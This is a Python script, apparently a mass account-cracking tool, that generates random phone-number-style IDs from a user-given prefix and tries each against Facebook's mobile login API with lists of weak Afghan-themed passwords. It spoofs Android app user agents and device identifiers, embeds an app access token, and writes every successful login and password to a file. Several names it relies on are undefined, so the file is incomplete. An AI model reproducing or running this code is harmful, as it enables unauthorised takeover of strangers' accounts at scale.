import os
import random
import string
from concurrent.futures import ThreadPoolExecutor as tred

def awmafghan():
    user = []
    code = input('PUT CODE: ')
    try:
        limit = int(input('LIMIT: '))
    except ValueError:
        limit = 5000

    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)

    with tred(max_workers=30) as AWM:
        for psx in user:
            ids = code + psx
            passlist = [psx, ids, 'afghan', 'afghan12345', 'afghan123', 'afghanistan', '500500', '100200', '10002000', 'kabul123', 'Afghan123', 'Afghanistan', '۱۲۳۴۵۶', '۱۲۳۴۵۶۷۸۹', '۱۰۰۲۰۰', '۵۰۰۵۰۰', '۵۰۰۶۰۰']
            AWM.submit(rndm, ids, passlist)

def awmafghan1():
    user = []
    code = input('PUT CODE: ')
    try:
        limit = int(input('LIMIT: '))
    except ValueError:
        limit = 5000

    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)

    with tred(max_workers=30) as AWM:
        for psx in user:
            ids = code + psx
            passlist = [psx, ids, 'afghan', 'afghan12345', 'afghan123', 'afghanistan', '500500', '100200', '10002000', 'kabul123', 'Afghan123', 'Afghanistan', '۱۲۳۴۵۶', '۱۲۳۴۵۶۷۸۹', '۱۰۰۲۰۰', '۵۰۰۵۰۰', '۵۰۰۶۰۰', 'Afghan1234', 'kabul1234', 'Kabul123', 'Kabul1234']
            AWM.submit(rndm2, ids, passlist)

def rndm(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [AWM-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                accessToken="350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                                awmsim = random.choice(awmsim1)
                                gtt=random.choice(modelxxx)
                                enawm=random.choice(enawm1)
                                awmfban=random.choice(awmfban1)
                                gttt=random.choice(modelxxx)
                                android_version=str(random.randrange(6,13))
                                awm_ua = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gttt)} Build/{str(gtt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.25,height=1024,width=2048};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/{str(awmsim)};FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                device_family_id = str(uuid.uuid4())
                                machine_id = ''.join(random.choice(ascii_uppercase+ascii_lowercase+digits+'_') for _ in range(24))
                                data = {
                                'adid':adid,
                                'format':'json',
                                'device':gtt,
                                'device_id':adid,
                                'email':ids,
                                'password':pas,
                                "logged_out_id": str(uuid.uuid4()),
                                "hash_id": str(uuid.uuid4()),
                                "reg_instance": str(uuid.uuid4()),
                                "session_id": str(uuid.uuid4()),
                                "advertiser_id": str(uuid.uuid4()),
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                "sim_country": "id",
                                "network_country": "id",
                                "relative_url": "method/auth.login",
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'machine_id':machine_id,
                                'generate_machine_id':'1',
                                "locale":"en_US","client_country_code":"US",
                                'fb_api_req_friendly_name':'authenticate',
                                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
                                head ={
                                'Authorization':f'OAuth {accessToken}',
                                "X-FB-Connection-Type": 'unknown',
                                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 40000000)),
                                "X-FB-Net-HNI": str(random.randint(2e4, 4e4)),
                                'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-connection-quality':'EXCELLENT',
                                'X-FB-device-group': '5120',
                                'x-fb-session-id':'Unid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
                                'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',
                                'User-Agent':awm_ua,   
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                "X-FB-Client-IP": "True",
                                "X-Tigon-Is-Retry": "False",
                                "X-FB-Server-Cluster": "True",
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                                url = 'https://b-api.facebook.com/method/auth.login'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/AWM-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [AWM-OK] '+str(uid)+' | '+pas+'\033[1;90m')
                                                        open('/sdcard/AWM-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [AWM-OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/AWM-OK-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
def rndm2(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [AWM-M2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                application_version = str(random.randint(111,777))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,777))
                                application_version_code=str(random.randint(000000000,777777777))
                                fbs=random.choice(fbks)
                                accessToken="350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                                awmsim = random.choice(awmsim1)
                                gtt=random.choice(scmodel)
                                enawm=random.choice(enawm1)
                                awmfban=random.choice(awmfban1)
                                gttt=random.choice(scmodel) 
                                android_version=str(random.randrange(6,13))
                                mirwais = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=2.75,width=1080,height=2131};FBLC/en_US;FBRV/str(random.randint(000000000,999999999));FBCR/Etisalat;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 11 Pro;FBSV/10;FBBK/1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                device_family_id = str(uuid.uuid4())
                                machine_id = ''.join(random.choice(ascii_uppercase+ascii_lowercase+digits+'_') for _ in range(24))
                                data = {
                                'adid':adid,
                                'format':'json',
                                'device':gtt,
                                'device_id':adid,
                                'email':ids,
                                'password':pas,
                                "logged_out_id": str(uuid.uuid4()),
                                "hash_id": str(uuid.uuid4()),
                                "reg_instance": str(uuid.uuid4()),
                                "session_id": str(uuid.uuid4()),
                                "advertiser_id": str(uuid.uuid4()),
                                'generate_analytics_claims':'1',
                                'try_num':'1',
                                'credentials_type':'password',
                                'community_id':'',
                                'secure_family_device_id':'',
                                'cpl':'true',
                                'currently_logged_in_userid':'0',
                                'source':'login',
                                "sim_country": "id",
                                "network_country": "id",
                                "relative_url": "method/auth.login",
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'machine_id':machine_id,
                                'meta_inf_fbmeta':'NO_FILE',
                                "locale":"en_US","client_country_code":"US",
                                'fb_api_req_friendly_name':'authenticate',
                                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
                                head={     
                                "X-FB-Connection-Type": 'MOBILE.LTE',
                                'x-fb-connection-quality':'EXCELLENT',
                                "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 40000000)),
                                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                                'X-FB-SIM-HNI':str(random.randint(20000, 40000)),
                                'X-FB-device-group': str(random.randint(2e7,3e7)),
                                "X-FB-Friendly-Name": "authenticate",
                                "X-FB-Friendly-Name": "ViewerReactionsMutation",                 
                                "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
                                "Content-Type": "application/x-www-form-urlencoded",
                                "User-Agent": mirwais,
                                'x-fb-rmd':'cached=0;state=NO_MATCH',
                                'x-fb-request-analytics-tags':'unknown',
                                "Connection": "Close",
                                "Accept-Encoding": "gzip, deflate",
                                "X-FB-Server-Cluster": "True",
                                "X-Tigon-Is-Retry": "False",
                                "X-FB-Client-IP": "True",
                                 'X-FB-HTTP-Engine': 'Liger'}
                                url = 'https://b-api.facebook.com/method/auth.login'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/AWM-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [AWM-OK] '+str(uid)+' | '+pas+'\033[1;90m')
                                                        open('/sdcard/AWM-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [AWM-OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/AWM-OK-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
                
try:
	menu()
except requests.exceptions.ConnectionError:
	print('No internet connection ...')
	exit()
except:exit()
